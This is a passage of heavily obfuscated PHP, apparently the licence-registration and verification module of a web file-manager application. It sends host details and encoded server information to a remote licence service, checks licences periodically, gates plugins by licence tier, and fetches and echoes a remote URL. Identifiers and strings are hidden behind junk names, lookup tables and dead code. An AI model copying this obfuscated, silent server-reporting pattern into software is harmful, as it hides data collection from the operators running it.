$Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[102]] = Mcrypt::encode(Session::sign(), $¿ç¶Êí, 3600 * 24); $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[103]] = Action($ò ‰¨åå[104])->accessToken(); $›Éïà•¦ = $õ¬ïù»Ğ[715]; $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[105]] = md5($_SERVER[$ò ‰¨åå[106]] . $ûÈ‚ºîØ[$ò ‰¨åå[100]]); $äëì§Î  = $õ¬ïù»Ğ[716]; if (strlen($äëì§Î ) < $õ¬ïù»Ğ[688]) { die; } $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[107]] = base64_encode(serverInfo()); $›ÔÑ × = $õ¬ïù»Ğ[717]; if (strlen($›ÔÑ ×) < $õ¬ïù»Ğ[697]) { return; } $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[108]] = $this->pvfs46919b72; if ($ûÈ‚ºîØ[$ò ‰¨åå[108]] != $ò ‰¨åå[109]) { $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[110]] = $ûÈ‚ºîØ[$ò ‰¨åå[110]]; $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[111]] = $ûÈ‚ºîØ[$ò ‰¨åå[111]]; $«ÜÉÍœÊ = rand_string(10) . $this->pvfs46919b72 . rand_string(5); $Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[112]][$ò ‰¨åå[113]] = $this->tiled47828e6($«ÜÉÍœÊ, $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[105]]); } if ($this->pvfs46919b72 == $ò ‰¨åå[109]) { $Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$ò ‰¨åå[94]][$ò ‰¨åå[98]] = 0; } $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[114]] = $this->versionPluginFilter(); $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[115]] = _get($this->rnyf5ff11d07, $ò ‰¨åå[116], $ò ‰¨åå[6]); $Ë¦ ¡“” = $õ¬ïù»Ğ[718]; if (KodUser::isRoot() && $this->config[$ò ‰¨åå[117]]) { $Æô¯ù“[$ò ‰¨åå[101]][$ò ‰¨åå[118]] = WEB_ROOT; } return $Æô¯ù“; } private function hkfm97fc2cee() { $òƒ‡¿Œ‡ =& $_SERVER[¼¥ÊĞÙÌ]; $î¿ì¡ùò =& $_SERVER[ƒ›ÍÚğ]; $Ü™ã–’Ê = $_SERVER[$î¿ì¡ùò[24]] == $î¿ì¡ùò[119]; if ($_SERVER[$î¿ì¡ùò[24]] == $î¿ì¡ùò[120] && $_GET[$î¿ì¡ùò[121]] == $î¿ì¡ùò[122]) { $Ü™ã–’Ê = !0; } if ($Ü™ã–’Ê) { $‚—šŞşÖ = array($î¿ì¡ùò[108] => $this->pvfs46919b72, $î¿ì¡ùò[123] => $this->twsm684b4bdf(), $î¿ì¡ùò[124] => Model($î¿ì¡ùò[125])->count()); if ($this->pvfs46919b72 != $î¿ì¡ùò[109]) { $ §™ñü­ = _get($this->rnyf5ff11d07, $î¿ì¡ùò[126]); if ($ §™ñü­) { $‚—šŞşÖ[$î¿ì¡ùò[127]] = $ §™ñü­; $‚—šŞşÖ[$î¿ì¡ùò[128]] = strtotime(_get($this->rnyf5ff11d07, $î¿ì¡ùò[129])); $‚—šŞşÖ[$î¿ì¡ùò[130]] = _get($this->rnyf5ff11d07, $î¿ì¡ùò[116]); } $Õ­—Â = Model($î¿ì¡ùò[33])->get($î¿ì¡ùò[131], $î¿ì¡ùò[6], !0); if (is_string($Õ­—Â) && substr($Õ­—Â, 0, 1) == $î¿ì¡ùò[132]) { $Õ­—Â = json_decode_force($Õ­—Â); } if (is_array($Õ­—Â) && $Õ­—Â[$î¿ì¡ùò[133]] && strstr($Õ­—Â[$î¿ì¡ùò[133]], $î¿ì¡ùò[134])) { $ªÒšµóè = explode($î¿ì¡ùò[134], $Õ­—Â[$î¿ì¡ùò[133]]); $‚—šŞşÖ[$î¿ì¡ùò[135]] = $ªÒšµóè[0]; } } $‚—šŞşÖ = $this->yjqkcf189302(json_encode($‚—šŞşÖ), md5($î¿ì¡ùò[136])); $¶‚Ä×‡İ = array($î¿ì¡ùò[137] => $‚—šŞşÖ); call_user_func(array($î¿ì¡ùò[138], $î¿ì¡ùò[139]), $¶‚Ä×‡İ); $Àô¼à¿ë = $òƒ‡¿Œ‡[719]; if (strlen($Àô¼à¿ë) < $òƒ‡¿Œ‡[695]) { die; } } if ($this->pvfs46919b72 == $î¿ì¡ùò[109]) { return; } $ø†ÎŸã = array($î¿ì¡ùò[140], $î¿ì¡ùò[141], $î¿ì¡ùò[142], $î¿ì¡ùò[143], $î¿ì¡ùò[144], $î¿ì¡ùò[145]); $Š”÷Ÿ¬× = Model($î¿ì¡ùò[33])->get(); $ïŞº­¬ñ = $òƒ‡¿Œ‡[720]; while (strlen($ïŞº­¬ñ) < $òƒ‡¿Œ‡[695]) { if (!$ïŞº­¬ñ) { break; } $ïŞº­¬ñ++; } $¶‚Ä×‡İ = array($î¿ì¡ùò[146] => $Š”÷Ÿ¬×[$î¿ì¡ùò[34]], $î¿ì¡ùò[147] => $Š”÷Ÿ¬×[$î¿ì¡ùò[35]], $î¿ì¡ùò[148] => $î¿ì¡ùò[6]); $ƒòŞ¦ = $òƒ‡¿Œ‡[721]; if (!$ƒòŞ¦) { die; } foreach ($ø†ÎŸã as $ï°ïòëœ) { if (!isset($Š”÷Ÿ¬×[$ï°ïòëœ]) || !$Š”÷Ÿ¬×[$ï°ïòëœ]) { continue; } $¶‚Ä×‡İ[$ï°ïòëœ] = $Š”÷Ÿ¬×[$ï°ïòëœ]; } call_user_func(array($î¿ì¡ùò[138], $î¿ì¡ùò[139]), $¶‚Ä×‡İ); $‚ã­›ö€ = $òƒ‡¿Œ‡[722]; if (strlen($‚ã­›ö€) < $òƒ‡¿Œ‡[697]) { return; } } private function wkbm0807825c() { $´‘³Í¦æ =& $_SERVER[¼¥ÊĞÙÌ]; $ÓÙÏ‚°Ş =& $_SERVER[ƒ›ÍÚğ]; if ($_SERVER[$ÓÙÏ‚°Ş[24]] != $ÓÙÏ‚°Ş[149]) { return; } if (!KodUser::isRoot()) { die; } $ÂƒúŠ†” = $GLOBALS[$ÓÙÏ‚°Ş[13]]; if (isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[150]])) { $this->wlrb9ade1093(); die; } if (isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[151]]) && isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[151]]) == $ÓÙÏ‚°Ş[122]) { $ÂƒúŠ†”[$ÓÙÏ‚°Ş[152]] = Model($ÓÙÏ‚°Ş[33])->get($ÓÙÏ‚°Ş[153]); } if (!isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[152]]) || strlen($ÂƒúŠ†”[$ÓÙÏ‚°Ş[152]]) != 16) { show_json($ÓÙÏ‚°Ş[154] . $ÂƒúŠ†”[$ÓÙÏ‚°Ş[152]], !1); } $ëöÉÉ°Ù = Model($ÓÙÏ‚°Ş[33])->get($ÓÙÏ‚°Ş[100]); $Ôü”ë¢« = md5($_SERVER[$ÓÙÏ‚°Ş[106]] . $ëöÉÉ°Ù); $İ½Òª¢˜ = array($ÓÙÏ‚°Ş[152] => $ÂƒúŠ†”[$ÓÙÏ‚°Ş[152]], $ÓÙÏ‚°Ş[155] => rand_string(16), $ÓÙÏ‚°Ş[156] => $ÓÙÏ‚°Ş[136], $ÓÙÏ‚°Ş[157] => $ÓÙÏ‚°Ş[158], $ÓÙÏ‚°Ş[159] => $_SERVER[$ÓÙÏ‚°Ş[160]], $ÓÙÏ‚°Ş[161] => $_SERVER[$ÓÙÏ‚°Ş[162]], $ÓÙÏ‚°Ş[163] => $_SERVER[$ÓÙÏ‚°Ş[164]], $ÓÙÏ‚°Ş[105] => $Ôü”ë¢«, $ÓÙÏ‚°Ş[165] => Model($ÓÙÏ‚°Ş[33])->get($ÓÙÏ‚°Ş[131])); $¯ş†Àº = $´‘³Í¦æ[723]; while ($¯ş†Àº < $´‘³Í¦æ[724]) { if ($¯ş†Àº >= 0) { break; } $¯ş†Àº++; } if (isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[151]]) && isset($ÂƒúŠ†”[$ÓÙÏ‚°Ş[151]]) == $ÓÙÏ‚°Ş[122]) { $İ½Òª¢˜[$ÓÙÏ‚°Ş[151]] = md5($İ½Òª¢˜[$ÓÙÏ‚°Ş[152]] . $ÓÙÏ‚°Ş[166] . $İ½Òª¢˜[$ÓÙÏ‚°Ş[155]]); } if ($ÂƒúŠ†”[$ÓÙÏ‚°Ş[167]] == $ÓÙÏ‚°Ş[168]) { $®‘¢â¼÷ = $this->yjqkcf189302($Ôü”ë¢«, $ÓÙÏ‚°Ş[169]); $ÏüÜÃ¨— = $this->tiled47828e6(json_encode($İ½Òª¢˜), $Ôü”ë¢« . $ÓÙÏ‚°Ş[170], 3); $ÏüÜÃ¨— = $ÏüÜÃ¨— . $ÓÙÏ‚°Ş[171] . $_SERVER[$ÓÙÏ‚°Ş[160]]; $½ùÁÓÉ = $this->mjngf5c7de58($ÓÙÏ‚°Ş[172] . $®‘¢â¼÷ . $ÓÙÏ‚°Ş[173] . $ÏüÜÃ¨—, -1); show_json($½ùÁÓÉ, !0); } else { if ($ÂƒúŠ†”[$ÓÙÏ‚°Ş[167]] == $ÓÙÏ‚°Ş[174]) { $¹åô‰É½ = substr(md5($ÓÙÏ‚°Ş[175] . $Ôü”ë¢«), 12, 15) . $ÓÙÏ‚°Ş[176]; $ÏüÜÃ¨— = $this->qtkx41274ccb(trim($ÂƒúŠ†”[$ÓÙÏ‚°Ş[177]]), $¹åô‰É½, 2); $”¤ÒÁÃÜ = json_decode($ÏüÜÃ¨—, !0); if (!is_array($”¤ÒÁÃÜ) || !is_array($”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]]) || $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[152]] != !0) { $ßç±ÀÀ = $ÓÙÏ‚°Ş[179]; $°î°îî = $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]] ? $ÓÙÏ‚°Ş[180] . $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]] : $ßç±ÀÀ; show_json($°î°îî, !1); } else { $İ½Òª¢˜[$ÓÙÏ‚°Ş[155]] = $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]][$ÓÙÏ‚°Ş[181]]; } } else { $”¤ÒÁÃÜ = $this->mjngf5c7de58($ÓÙÏ‚°Ş[182], $İ½Òª¢˜, 10); $ËÃ¶¼ãè = $´‘³Í¦æ[725]; } } if (!is_array($”¤ÒÁÃÜ) || !is_array($”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]]) || $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[152]] != !0) { $ßç±ÀÀ = LNG($ÓÙÏ‚°Ş[183]); $°î°îî = $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]] ? $ÓÙÏ‚°Ş[180] . $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]] : $ßç±ÀÀ; show_json($°î°îî, !1); } $ÁÊøÇ£Ú = $”¤ÒÁÃÜ[$ÓÙÏ‚°Ş[178]]; $ È×ß¿ = $this->tbpu598ab699($ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[184]]); if (!$ È×ß¿ || $ È×ß¿ != $ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[129]]) { $óÎê¿èÄ = array($ÓÙÏ‚°Ş[185] => Model($ÓÙÏ‚°Ş[33])->get($ÓÙÏ‚°Ş[100]), $ÓÙÏ‚°Ş[186] => $_SERVER[$ÓÙÏ‚°Ş[106]], $ÓÙÏ‚°Ş[187] => this_url(), $ÓÙÏ‚°Ş[161] => $_SERVER[$ÓÙÏ‚°Ş[162]]); $ÏüÜÃ¨— = $this->fsdke89118ad(json_encode($óÎê¿èÄ)); $this->mjngf5c7de58($ÓÙÏ‚°Ş[188] . $ÏüÜÃ¨—); show_json(LNG($ÓÙÏ‚°Ş[189]), !0); } $ºŞÍ = array($ÓÙÏ‚°Ş[153] => $ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[190]], $ÓÙÏ‚°Ş[191] => $ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[192]], $ÓÙÏ‚°Ş[193] => rand_string(16), $ÓÙÏ‚°Ş[108] => $ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[194]]); if ($İ½Òª¢˜[$ÓÙÏ‚°Ş[155]]) { $ºŞÍ[$ÓÙÏ‚°Ş[193]] = $İ½Òª¢˜[$ÓÙÏ‚°Ş[155]]; } $ü ó¬º‹ = substr(md5($ºŞÍ[$ÓÙÏ‚°Ş[191]]), 10, 10); $ŒúÌ²¾ = $ü ó¬º‹ . $ºŞÍ[$ÓÙÏ‚°Ş[108]] . $ºŞÍ[$ÓÙÏ‚°Ş[193]]; $÷Ç­˜’ê = $´‘³Í¦æ[726]; while (strlen($÷Ç­˜’ê) < $´‘³Í¦æ[688]) { if (!$÷Ç­˜’ê) { break; } $÷Ç­˜’ê++; } $ºŞÍ[$ÓÙÏ‚°Ş[110]] = strrev(base64_encode($this->yjqkcf189302($ŒúÌ²¾, $ÓÙÏ‚°Ş[195]))); $²ì´ÌÚ = rand_string(16); $×»âğö³ = $´‘³Í¦æ[727]; $ö¹¢ßòø = $²ì´ÌÚ . $ºŞÍ[$ÓÙÏ‚°Ş[108]] . $this->yjqkcf189302(md5($ºŞÍ[$ÓÙÏ‚°Ş[153]]), $²ì´ÌÚ); $Ÿİ°Ÿ‘Ÿ = $´‘³Í¦æ[728]; if (strlen($Ÿİ°Ÿ‘Ÿ) < $´‘³Í¦æ[724]) { return; } $ºŞÍ[$ÓÙÏ‚°Ş[111]] = base64_encode(strrev($this->yjqkcf189302($ö¹¢ßòø, $ÓÙÏ‚°Ş[196]))); if ($ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[197]] && $ÁÊøÇ£Ú[$ÓÙÏ‚°Ş[197]] >= 1) { Model($ÓÙÏ‚°Ş[33])->setDeep($ÓÙÏ‚°Ş[198], $ÓÙÏ‚°Ş[122]); } Model($ÓÙÏ‚°Ş[33])->set($ºŞÍ); $¶¥»Œè = md5($_SERVER[$ÓÙÏ‚°Ş[106]] . strrev($ëöÉÉ°Ù) . $ºŞÍ[$ÓÙÏ‚°Ş[191]]); $²êçÊ¤¶ = $´‘³Í¦æ[729]; if (strlen($²êçÊ¤¶) < $´‘³Í¦æ[688]) { die; } $ÂŞğü¥¥ = strrev(substr($¶¥»Œè, 10, 16)); $ú¦À–èí = $this->tiled47828e6(json_encode($ÁÊøÇ£Ú), $¶¥»Œè); $ËÔĞ«¸Ò = array_to_keyvalue(Model($ÓÙÏ‚°Ş[7])->listData(), $ÓÙÏ‚°Ş[199]); $£Ñ°‰Ò = $´‘³Í¦æ[730]; $èåÔü¼« = $ËÔĞ«¸Ò[$ÓÙÏ‚°Ş[200]]; $›ÏÅäÛ¢ = array(); $›ÏÅäÛ¢[$ÂŞğü¥¥] = $ú¦À–èí; $š«üò¡… = $´‘³Í¦æ[731]; if (strlen($š«üò¡…) < $´‘³Í¦æ[695]) { return; } Model($ÓÙÏ‚°Ş[7])->update($èåÔü¼«[$ÓÙÏ‚°Ş[201]], array($ÓÙÏ‚°Ş[202] => $›ÏÅäÛ¢)); $û©˜¾« = $´‘³Í¦æ[732]; if (strlen($û©˜¾«) < $´‘³Í¦æ[693]) { die; } $this->rnyf5ff11d07 = $ÁÊøÇ£Ú; $this->pvfs46919b72 = $ºŞÍ[$ÓÙÏ‚°Ş[108]]; $this->licenseRegistSuccess(); Cache::set($ÓÙÏ‚°Ş[203] . md5($ëöÉÉ°Ù . $ÓÙÏ‚°Ş[204]), $ÓÙÏ‚°Ş[6]); $ö·ö”ç = $´‘³Í¦æ[733]; if (!$ö·ö”ç) { die; } show_json(LNG($ÓÙÏ‚°Ş[189]), !0); } private function licenseRegistSuccess() { $¶æ›—›ı =& $_SERVER[ƒ›ÍÚğ]; $”÷Êš€ = Model($¶æ›—›ı[33])->get(); if ($”÷Êš€[$¶æ›—›ı[63]] != $¶æ›—›ı[122]) { Model($¶æ›—›ı[33])->set($¶æ›—›ı[63], $¶æ›—›ı[122]); } Action($¶æ›—›ı[205])->initStart(!0); } private function wlrb9ade1093() { $éèšõ±Û =& $_SERVER[¼¥ÊĞÙÌ]; $ÆıÂ¸ÉŞ =& $_SERVER[ƒ›ÍÚğ]; Model($ÆıÂ¸ÉŞ[33])->set(array($ÆıÂ¸ÉŞ[153] => $ÆıÂ¸ÉŞ[6], $ÆıÂ¸ÉŞ[191] => $ÆıÂ¸ÉŞ[6], $ÆıÂ¸ÉŞ[108] => $ÆıÂ¸ÉŞ[109], $ÆıÂ¸ÉŞ[110] => $ÆıÂ¸ÉŞ[6], $ÆıÂ¸ÉŞ[111] => $ÆıÂ¸ÉŞ[6])); $‰²ß­û´ = $éèšõ±Û[734]; if (!$‰²ß­û´) { return; } Model($ÆıÂ¸ÉŞ[33])->setDeep($ÆıÂ¸ÉŞ[198], $ÆıÂ¸ÉŞ[206]); $this->rnyf5ff11d07 = array(); $‹‘òË £ = $éèšõ±Û[735]; while (strlen($‹‘òË £) < $éèšõ±Û[693]) { if (!$‹‘òË £) { break; } $‹‘òË £++; } $this->pvfs46919b72 = $ÆıÂ¸ÉŞ[109]; $ÁÊ«Öç = $éèšõ±Û[736]; if (strlen($ÁÊ«Öç) < $éèšõ±Û[697]) { return; } } private function crsg3cfc2cc6() { $’à×é¹† =& $_SERVER[¼¥ÊĞÙÌ]; $’•ºë›¤ =& $_SERVER[ƒ›ÍÚğ]; $_SERVER[$’•ºë›¤[162]] = _get($_SERVER, $’•ºë›¤[162], APP_HOST); $this->pvfs46919b72 = $’•ºë›¤[109]; $âòìëª  = Model($’•ºë›¤[33])->get(); $¹‘ÕÆ¿û = $’à×é¹†[737]; if (!$¹‘ÕÆ¿û) { return; } if ($âòìëª [$’•ºë›¤[108]] == $’•ºë›¤[109]) { return; } $ø¤Ã”Ú½ = Model($’•ºë›¤[33])->get($’•ºë›¤[100]); $®Ìâ’¸ª = $’•ºë›¤[203] . md5($ø¤Ã”Ú½ . $’•ºë›¤[204]); $·‡—”ú¼ = $’à×é¹†[738]; if (strlen($·‡—”ú¼) < $’à×é¹†[688]) { die; } $ª‘ìêÄª = Cache::get($®Ìâ’¸ª); if (!is_array($ª‘ìêÄª) || !isset($ª‘ìêÄª[$’•ºë›¤[207]]) || time() - $ª‘ìêÄª[$’•ºë›¤[207]] >= 60) { $Å™ñ™ò = Model($’•ºë›¤[7])->loadList(); $æ…óù°ä = $Å™ñ™ò[$’•ºë›¤[200]]; $Ñáçû’£ = md5($_SERVER[$’•ºë›¤[106]] . strrev($ø¤Ã”Ú½) . $âòìëª [$’•ºë›¤[191]]); $ÀÓƒÕõ = strrev(substr($Ñáçû’£, 10, 16)); $ª‘ìêÄª = $this->qtkx41274ccb($æ…óù°ä[$’•ºë›¤[86]][$ÀÓƒÕõ], $Ñáçû’£); $ª‘ìêÄª = json_decode($ª‘ìêÄª, !0); } if (!is_array($ª‘ìêÄª)) { return $this->wlrb9ade1093(); } $ç ü»À× = strtotime($ª‘ìêÄª[$’•ºë›¤[129]]); if (time() >= $ç ü»À×) { return $this->wlrb9ade1093(); } if (!isset($ª‘ìêÄª[$’•ºë›¤[207]]) || time() - $ª‘ìêÄª[$’•ºë›¤[207]] > 20) { $ª‘ìêÄª[$’•ºë›¤[207]] = time(); Cache::set($®Ìâ’¸ª, $ª‘ìêÄª); } $this->rnyf5ff11d07 = $ª‘ìêÄª; $this->pvfs46919b72 = $âòìëª [$’•ºë›¤[108]]; } private function ovxr28bf0256() { $ã„ÊÆßŞ =& $_SERVER[¼¥ÊĞÙÌ]; $³øö¬¶ë =& $_SERVER[ƒ›ÍÚğ]; $‡´¶Éš¯ = $GLOBALS[$³øö¬¶ë[13]]; $´†Æï™‹ = $ã„ÊÆßŞ[739]; if (strlen($´†Æï™‹) < $ã„ÊÆßŞ[724]) { die; } $²áñÍéÏ = $_SERVER[$³øö¬¶ë[24]]; if ($²áñÍéÏ == $³øö¬¶ë[208] && $this->pvfs46919b72 == $³øö¬¶ë[109]) { show_json(LNG($³øö¬¶ë[209]), !1, $³øö¬¶ë[210]); } $¸ã­êİ» = array($³øö¬¶ë[211], $³øö¬¶ë[212]); if (in_array($²áñÍéÏ, $¸ã­êİ»)) { if ($this->pvfs46919b72 == $³øö¬¶ë[109] && isset($‡´¶Éš¯[$³øö¬¶ë[213]])) { show_json(LNG($³øö¬¶ë[209]), !1, $³øö¬¶ë[210]); die; } $§‘‰â÷Ë = $this->twsm684b4bdf(); if ($§‘‰â÷Ë != intval($³øö¬¶ë[214])) { if ($§‘‰â÷Ë <= Model($³øö¬¶ë[125])->count()) { show_json(LNG($³øö¬¶ë[215]), !1, $³øö¬¶ë[210]); die; } } } } private function fcmedc5eb81c() { $ş¬ƒİ¦ =& $_SERVER[¼¥ÊĞÙÌ]; $°À•®Õ© =& $_SERVER[ƒ›ÍÚğ]; $¼ÎÈì¿µ = array($°À•®Õ©[119], $°À•®Õ©[120]); $±®¡‹Ó‡ = $ş¬ƒİ¦[740]; if (strlen($±®¡‹Ó‡) < $ş¬ƒİ¦[697]) { return; } if (!KodUser::isRoot() || !isset($_GET[$°À•®Õ©[216]])) { return; } if (!in_array($_SERVER[$°À•®Õ©[24]], $¼ÎÈì¿µ)) { return; } $ïª¨ïÒ× = $°À•®Õ©[217]; $Ææ‘¤Ô— = $ş¬ƒİ¦[741]; if (!$Ææ‘¤Ô—) { return; } $ïª¨ïÒ× = $this->bgcs9ebcf1a5($ïª¨ïÒ×, $°À•®Õ©[218]); $şÊ¥ïòˆ = $ş¬ƒİ¦[742]; $·È¯…Şê = stream_context_create(array($°À•®Õ©[219] => array($°À•®Õ©[220] => $°À•®Õ©[221], $°À•®Õ©[222] => 3))); $éÍ¬£ = @file_get_contents($ïª¨ïÒ×, !1, $·È¯…Şê); header($°À•®Õ©[223]); $ÇäóÓöÎ = $ş¬ƒİ¦[743]; if ($éÍ¬£ && strstr($éÍ¬£, $°À•®Õ©[224])) { echo $éÍ¬£; } die; } public function tgfu441864fe($³„‘½ÅĞ) { $üÀ™Èª =& $_SERVER[¼¥ÊĞÙÌ]; $ÒşşèìÊ =& $_SERVER[ƒ›ÍÚğ]; if ($this->pvfs46919b72 == $ÒşşèìÊ[225]) { return $³„‘½ÅĞ; } $ä´±€ì… = $this->versionPluginList(); $íûÈÖ = explode($ÒşşèìÊ[226], $this->versionPluginFilter()); $°ô’×ñæ = $üÀ™Èª[744]; if (strlen($°ô’×ñæ) < $üÀ™Èª[724]) { return; } $ôˆÉß­µ = array(); foreach ($ä´±€ì… as $Ÿ‡•îşœ => $‘õÙÂî­) { if ($‘õÙÂî­ == $ÒşşèìÊ[227] && substr($this->pvfs46919b72, 0, 1) == $ÒşşèìÊ[227]) { continue; } if (!in_array($Ÿ‡•îşœ, $íûÈÖ)) { $ôˆÉß­µ[] = $Ÿ‡•îşœ; } } foreach ($ôˆÉß­µ as $Ÿ‡•îşœ) { unset($³„‘½ÅĞ[$Ÿ‡•îşœ]); } return $³„‘½ÅĞ; } private function versionPluginList() { $§ÓšÌÕê =& $_SERVER[ƒ›ÍÚğ]; return array($§ÓšÌÕê[228] => $§ÓšÌÕê[227], $§ÓšÌÕê[229] => $§ÓšÌÕê[227], $§ÓšÌÕê[230] => $§ÓšÌÕê[227], $§ÓšÌÕê[231] => $§ÓšÌÕê[232], $§ÓšÌÕê[233] => $§ÓšÌÕê[232], $§ÓšÌÕê[234] => $§ÓšÌÕê[232], $§ÓšÌÕê[235] => $§ÓšÌÕê[232], $§ÓšÌÕê[236] => $§ÓšÌÕê[232], $§ÓšÌÕê[237] => $§ÓšÌÕê[232], $§ÓšÌÕê[238] => $§ÓšÌÕê[232], $§ÓšÌÕê[239] => $§ÓšÌÕê[232], $§ÓšÌÕê[240] => $§ÓšÌÕê[232], $§ÓšÌÕê[241] => $§ÓšÌÕê[232], $§ÓšÌÕê[242] => $§ÓšÌÕê[232], $§ÓšÌÕê[243] => $§ÓšÌÕê[232], $§ÓšÌÕê[244] => $§ÓšÌÕê[232], $§ÓšÌÕê[245] => $§ÓšÌÕê[232]); } private function versionPluginFilter() { $ıõ÷»Úô =& $_SERVER[¼¥ÊĞÙÌ]; $óÚîğç– =& $_SERVER[ƒ›ÍÚğ]; if ($this->pvfs46919b72 == $óÚîğç–[109]) { return $óÚîğç–[6]; } $ÁÜ»›Î = _get($this->rnyf5ff11d07, $óÚîğç–[246], $óÚîğç–[6]); $Š—†Ï§Ê = $ıõ÷»Úô[745]; if (!$Š—†Ï§Ê) { return; } $ÓÜ—éÌÃ = _get($this->rnyf5ff11d07, $óÚîğç–[116], $óÚîğç–[6]); $ÅşçòäÃ = $ıõ÷»Úô[746]; if (strlen($ÅşçòäÃ) < $ıõ÷»Úô[688]) { return; } $ËÌµ­¢° = _get($this->rnyf5ff11d07, $óÚîğç–[247], $óÚîğç–[6]); $§·Ÿı½™ = $ıõ÷»Úô[747]; if (strlen($§·Ÿı½™) < $ıõ÷»Úô[695]) { die; } if ($ÓÜ—éÌÃ > time() && $ËÌµ­¢° > time()) { $¥Ğˆí¹ = explode($óÚîğç–[226], $ÁÜ»›Î); $‚ñÖ‘ˆŸ = array_keys($this->versionPluginList()); $ÁÜ»›Î = array_merge($¥Ğˆí¹, $‚ñÖ‘ˆŸ); $ÁÜ»›Î = implode($óÚîğç–[226], array_filter(array_unique($ÁÜ»›Î))); } return $ÁÜ»›Î; } private function bdwzbb5a15b2() { $Ë½¶ãÊÕ =& $_SERVER[ƒ›ÍÚğ]; if ($this->pvfs46919b72 != $Ë½¶ãÊÕ[109]) { $GLOBALS[$Ë½¶ãÊÕ[86]][$Ë½¶ãÊÕ[90]][$Ë½¶ãÊÕ[248]] = $Ë½¶ãÊÕ[206]; return; } $GLOBALS[$Ë½¶ãÊÕ[86]][$Ë½¶ãÊÕ[249]] = $Ë½¶ãÊÕ[122]; if (Model($Ë½¶ãÊÕ[250])->get($Ë½¶ãÊÕ[63]) != $Ë½¶ãÊÕ[206]) { Model($Ë½¶ãÊÕ[250])->set($Ë½¶ãÊÕ[63], $Ë½¶ãÊÕ[206]); } } public function csgy68459669() { $ÇïÏ†ù® =& $_SERVER[¼¥ÊĞÙÌ]; return $_SERVER[ƒ›ÍÚğ][251]; $×Âó¤ıè = $ÇïÏ†ù®[748]; while ($×Âó¤ıè < $ÇïÏ†ù®[724]) { if ($×Âó¤ıè >= 0) { break; } $×Âó¤ıè++; } } private function rkfl82122937() { $Õ¤åÊ =& $_SERVER[¼¥ÊĞÙÌ]; $ş¾Ä“® =& $_SERVER[ƒ›ÍÚğ]; $·ë§ÄñÅ = array($ş¾Ä“®[252], $ş¾Ä“®[253], $ş¾Ä“®[254]); $ñøÆô¹ = $ş¾Ä“®[255] . md5($ş¾Ä“®[256]); $öûã‰§ñ = $Õ¤åÊ[749]; if (strlen($öûã‰§ñ) < $Õ¤åÊ[688]) { return; } if ($this->pvfs46919b72 == $ş¾Ä“®[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ş¾Ä“®[24]], $·ë§ÄñÅ)) { return; } if (time() % 4 != 0) { return; } $ÍèıëÊò = call_user_func(array($ş¾Ä“®[257], $ş¾Ä“®[258]), $ñøÆô¹); if ($ÍèıëÊò && time() - $ÍèıëÊò < intval($ş¾Ä“®[259])) { return; } call_user_func(array($ş¾Ä“®[257], $ş¾Ä“®[139]), $ñøÆô¹, time()); $Ş ©òï = Model($ş¾Ä“®[33])->get($ş¾Ä“®[100]); $ÖéŠºÛÙ = $Õ¤åÊ[750]; if (strlen($ÖéŠºÛÙ) < $Õ¤åÊ[695]) { return; } $Ä¿Ö©¥Á = array($ş¾Ä“®[152] => Model($ş¾Ä“®[33])->get($ş¾Ä“®[153]), $ş¾Ä“®[167] => $this->pvfs46919b72, $ş¾Ä“®[163] => $_SERVER[$ş¾Ä“®[164]], $ş¾Ä“®[165] => Model($ş¾Ä“®[33])->get($ş¾Ä“®[131]), $ş¾Ä“®[105] => md5($_SERVER[$ş¾Ä“®[106]] . $Ş ©òï), $ş¾Ä“®[156] => $ş¾Ä“®[136], $ş¾Ä“®[159] => $_SERVER[$ş¾Ä“®[160]]); $ğóãÔÄ‘ = $Õ¤åÊ[751]; if (strlen($ğóãÔÄ‘) < $Õ¤åÊ[697]) { return; } $ª™óÎ±Ú = $this->mjngf5c7de58($ş¾Ä“®[260], $Ä¿Ö©¥Á); if (!is_array($ª™óÎ±Ú)) { return; } if ($ª™óÎ±Ú[$ş¾Ä“®[152]] && $ª™óÎ±Ú[$ş¾Ä“®[261]]) { if ($this->tbpu598ab699($ª™óÎ±Ú[$ş¾Ä“®[261]]) == $Ä¿Ö©¥Á[$ş¾Ä“®[152]]) { return; } } $this->wlrb9ade1093(); $İéç‡Ø = $Õ¤åÊ[752]; if (strlen($İéç‡Ø) < $Õ¤åÊ[697]) { return; } if ($this->tbpu598ab699($ª™óÎ±Ú[$ş¾Ä“®[261]]) != $Ä¿Ö©¥Á[$ş¾Ä“®[152]]) { $¾Ä¡´ = array($ş¾Ä“®[185] => $Ş ©òï, $ş¾Ä“®[186] => $_SERVER[$ş¾Ä“®[106]], $ş¾Ä“®[187] => this_url(), $ş¾Ä“®[161] => $_SERVER[$ş¾Ä“®[162]]); $ĞˆË¨ÚÓ = 